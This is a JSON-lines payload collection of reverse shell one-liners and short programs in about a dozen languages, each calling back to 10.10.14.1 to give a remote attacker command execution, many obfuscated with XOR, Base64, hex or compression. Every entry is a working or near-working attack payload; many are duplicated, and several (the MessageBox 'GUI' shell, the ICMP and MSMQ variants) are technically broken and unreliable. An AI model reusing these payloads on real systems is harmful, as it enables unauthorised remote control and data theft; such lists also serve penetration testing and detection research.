{"id":"rshell-228","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Web.HttpUtility]::UrlEncode($o));$m.Send($e)","description":"PowerShell SMTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","urlencode"]}
{"id":"rshell-229","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(\"udp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));while(<S>){chomp;system($_);}'","description":"Perl UDP reverse shell with command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","perl"]}
{"id":"rshell-230","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o))),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","base64"]}
{"id":"rshell-231","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=[cmd].pack(\"H*\").chomp;IO.popen(cmd,\"r\"){|io|c.print io.read.unpack(\"H*\")[0]}end'","description":"Ruby TCP reverse shell with hex-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","hex"]}
{"id":"rshell-232","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell gRPC reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","urlencode"]}
{"id":"rshell-233","language":"python","payload":"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'","description":"Python TCP reverse shell with URL-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","urlencode"]}
{"id":"rshell-234","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Web.HttpUtility]::UrlEncode($o));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","urlencode"]}
{"id":"rshell-235","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-236","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell GUI reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","base64"]}
{"id":"rshell-237","language":"lua","payload":"lua -e 'local s=require(\"socket\").tcp();s:connect(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(o);end'","description":"Lua TCP reverse shell with standard output.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","lua"]}
{"id":"rshell-238","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));iex $x","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-239","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/hex\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}","description":"Go TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","go","obfuscated","hex"]}
{"id":"rshell-240","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($wc.DownloadString('https://10.10.14.1:8443/cmd')));$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell HTTPS reverse shell with Base64-encoded input/output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","base64"]}
{"id":"rshell-241","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))","description":"Node.js TCP reverse shell with compressed Base64 input/output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","nodejs","obfuscated","base64","compressed"]}
{"id":"rshell-242","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","base64"]}
{"id":"rshell-243","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","base64"]}
{"id":"rshell-244","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([byte[]]$b[0..($i-1)],[Func[byte,byte]]{param($b);$b -bxor 0x3C})));$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with XOR-encoded input.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-245","language":"python","payload":"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'","description":"Python TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","hex"]}
{"id":"rshell-246","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-247","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'","description":"PHP TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","urlencode"]}
{"id":"rshell-248","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($d.AddressList[0].IPAddressToString));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with Base64-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","base64"]}
{"id":"rshell-249","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445","description":"Netcat TCP reverse shell with hex-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["tcp","netcat","obfuscated","hex"]}
{"id":"rshell-250","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","base64"]}
{"id":"rshell-251","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/sh\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing a shell.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java"]}
{"id":"rshell-252","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=[System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o));$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["websocket","powershell","obfuscated","urlencode"]}
{"id":"rshell-253","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-254","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$m.Send($e)","description":"PowerShell SMTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","base64"]}
{"id":"rshell-255","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'","description":"Perl TCP reverse shell with bash execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl","bash"]}
{"id":"rshell-256","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o))),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","base64"]}
{"id":"rshell-257","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,\"r\"){|io|c.print URI.encode(io.read)}end'","description":"Ruby TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","urlencode"]}
{"id":"rshell-258","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell gRPC reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","base64"]}
{"id":"rshell-259","language":"python","payload":"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'","description":"Python TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","base64"]}
{"id":"rshell-260","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","base64"]}
{"id":"rshell-261","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-262","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell GUI reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","urlencode"]}
{"id":"rshell-263","language":"lua","payload":"lua -e 'local s=require(\"socket\").udp();s:setpeername(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(require(\"zlib\").compress(o));end'","description":"Lua UDP reverse shell with compressed output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","lua","obfuscated","compressed"]}
{"id":"rshell-264","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));iex $x","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-265","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/base64\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}","description":"Go TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","go","obfuscated","base64"]}
{"id":"rshell-266","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($wc.DownloadString('https://10.10.14.1:8443/cmd')));$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell HTTPS reverse shell with Base64-encoded input/output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","base64"]}
{"id":"rshell-267","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))","description":"Node.js TCP reverse shell with compressed Base64 input/output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","nodejs","obfuscated","base64","compressed"]}
{"id":"rshell-268","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","base64"]}
{"id":"rshell-269","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","base64"]}
{"id":"rshell-270","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([byte[]]$b[0..($i-1)],[Func[byte,byte]]{param($b);$b -bxor 0x5A})));$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with XOR-encoded input.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-271","language":"python","payload":"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'","description":"Python TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","hex"]}
{"id":"rshell-272","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-273","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'","description":"PHP TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","urlencode"]}
{"id":"rshell-274","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($d.AddressList[0].IPAddressToString));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with Base64-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","base64"]}
{"id":"rshell-275","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445","description":"Netcat TCP reverse shell with hex-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["tcp","netcat","obfuscated","hex"]}
{"id":"rshell-276","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","base64"]}
{"id":"rshell-277","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/bash\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing bash.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java","bash"]}
{"id":"rshell-278","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o);$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["websocket","powershell"]}
{"id":"rshell-279","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-280","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Web.HttpUtility]::UrlEncode($o));$m.Send($e)","description":"PowerShell SMTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","urlencode"]}
{"id":"rshell-281","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(\"udp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));while(<S>){chomp;system($_);}'","description":"Perl UDP reverse shell with command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","perl"]}
{"id":"rshell-282","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o))),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","base64"]}
{"id":"rshell-283","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=[cmd].pack(\"H*\").chomp;IO.popen(cmd,\"r\"){|io|c.print io.read.unpack(\"H*\")[0]}end'","description":"Ruby TCP reverse shell with hex-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","hex"]}
{"id":"rshell-284","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell gRPC reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","urlencode"]}
